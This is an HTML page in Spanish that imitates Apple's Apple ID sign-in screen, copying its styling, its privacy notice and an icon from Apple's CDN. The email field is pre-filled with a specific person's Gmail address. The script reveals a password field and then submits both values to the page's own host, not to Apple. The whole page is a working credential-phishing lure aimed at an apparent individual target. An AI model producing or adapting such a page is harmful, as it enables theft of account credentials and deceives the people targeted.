<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Iniciar sesión en tu cuenta de Apple</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #1d1d1f;
        }

        .container {
            max-width: 400px;
            margin: 60px auto;
            padding: 0 20px;
            text-align: center;
        }

        .container h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 20px;
            line-height: 1.2;
            color: gray;
        }

        .input-field {
            width: 100%;
            padding: 14px;
            font-size: 17px;
            border: 1px solid #c6c6c8;
            border-radius: 6px;
            margin-bottom: 0;
            box-sizing: border-box;
            color: #1d1d1f;
            direction: ltr !important;
        }

        #apple_pwd {
            display: none;
            border-top: none;
            border-radius: 0 0 6px 6px;
            margin-top: -1px;
        }

        .flex-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 20px 0;
        }

        .flex-row label {
            font-size: 15px;
            color: #1d1d1f;
        }

        .flex-row input[type="checkbox"] {
            width: 18px;
            height: 18px;
            margin-right: 8px;
            accent-color: gray;
        }

        .flex-row a {
            font-size: 15px;
            color: #007aff;
            text-decoration: none;
        }

        .info-text {
            font-size: 13px;
            color: #6e6e73;
            text-align: left;
            line-height: 1.4;
            margin-bottom: 30px;
        }

        .info-text a {
            color: #007aff;
            text-decoration: none;
        }

        .btn {
            width: 100%;
            background-color: #007aff;
            color: #fff;
            font-size: 17px;
            padding: 14px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }

        .btn:active {
            background-color: #0051a8;
        }

        .privacy-icon {
            width: 42px;
            height: 36px;
            margin-bottom: 20px;
        }

        @media (max-width: 480px) {
            .container {
                margin: 30px auto;
                padding: 0 16px;
            }

            .container h1 {
                font-size: 22px;
            }

            .input-field,
            .btn {
                font-size: 16px;
                padding: 12px;
            }

            .flex-row label,
            .flex-row a {
                font-size: 14px;
            }

            .info-text {
                font-size: 12px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div style="margin:20px;">
            <h1 class="mt-5">Iniciar sesión en tu cuenta de Apple</h1>

            <form id="loginForm">
                <input class="input-field" name="xuser" id="apple_id" placeholder="Apple ID" type="email"
                    value="isales.brieno@gmail.com" autocomplete="username">

                <input class="input-field" autocomplete="current-password" name="xpass" id="apple_pwd"
                    placeholder="Contraseña" type="password">

                <div class="flex-row">
                    <label><input type="checkbox" checked> Recuérdame</label>
                    <a href="#">Crear tu cuenta de Apple</a>
                </div>

                <img src="https://appleid.cdn-apple.com/appleauth/static/bin/cb230738313/dist/assets/privacy-icon@2x.png"
                    class="privacy-icon">

                <div class="info-text">
                    La información de tu cuenta de Apple se usa para permitirte iniciar sesión y acceder a tus detalles.
                    Apple guarda ciertos detalles para fines de seguridad, apoyo y reportaje. Si aceptas, Apple
                    <a href="#">también</a> podrá usar la información de tu cuenta de Apple para enviarte correos
                    electrónicos y comunicaciones, lo que incluye contenido basado en tu uso de los servicios de Apple.
                    <a href="#">Consulta cómo se utiliza tu información…</a>
                </div>

                <button type="button" class="btn" id="continue-btn">Continuar</button>
            </form>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const appleId = document.getElementById('apple_id');
            const applePwd = document.getElementById('apple_pwd');
            const continueBtn = document.getElementById('continue-btn');

            // Mostrar campo contraseña cuando el ID tenga @ o se presione Enter
            appleId.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' || (this.value.includes('@') && this.value.length > 3)) {
                    e.preventDefault();
                    showPasswordField();
                }
            });

            // Botón Continuar
            continueBtn.addEventListener('click', function() {
                if (applePwd.style.display === 'block') {
                    document.getElementById('loginForm').submit();
                } else if (appleId.value.includes('@') && appleId.value.length > 3) {
                    showPasswordField();
                }
            });

            function showPasswordField() {
                applePwd.style.display = 'block';
                appleId.style.borderRadius = '6px 6px 0 0';
                applePwd.focus();
                continueBtn.textContent = 'Iniciar sesión';
            }

            // Auto-completar dominio si no tiene @
            appleId.addEventListener('blur', function() {
                if (this.value && !this.value.includes('@')) {
                    this.value += '@icloud.com';
                }
            });
        });
    </script>
</body>

</html>
